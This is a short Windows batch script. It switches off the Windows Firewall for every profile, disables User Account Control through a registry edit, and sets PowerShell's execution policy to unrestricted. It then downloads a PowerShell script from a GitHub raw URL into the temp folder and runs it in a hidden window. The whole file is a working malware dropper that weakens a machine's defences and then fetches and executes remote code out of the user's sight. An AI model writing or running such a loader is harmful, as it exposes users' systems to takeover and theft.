@echo off
echo Turning off Windows Firewall...
netsh advfirewall set domainprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
echo Skip UAC...
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
echo Download and save the Script to the temp folder
powershell -Command "Set-ExecutionPolicy Unrestricted -Force -Scope CurrentUser"
powershell -Command "curl https://raw.githubusercontent.com/d3d0n/funwngrok/main/final.ps1 -OutFile $env:temp\final.ps1"
echo Run the Script
powershell -WindowStyle Hidden -Command "& $env:temp\final.ps1"
echo Done!
